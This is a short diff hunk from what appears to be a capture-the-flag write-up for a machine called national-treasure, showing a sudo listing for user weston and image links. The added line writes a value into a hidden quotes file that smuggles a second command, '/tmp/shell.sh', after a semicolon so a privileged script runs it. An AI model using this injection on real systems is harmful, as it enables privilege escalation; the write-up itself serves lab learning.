@@ -122,7 +122,7 @@ User weston may run the following commands on national-treasure:
 
 ![image](https://github.com/user-attachments/assets/43161db1-0566-43cc-9d5b-a79c8dfcba44)
 
-
+- To get it to echo the executalbe file - ```printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes```
 
 ![image](https://github.com/user-attachments/assets/fef46213-21ef-47a0-9b3f-22aa961c1efa)
 
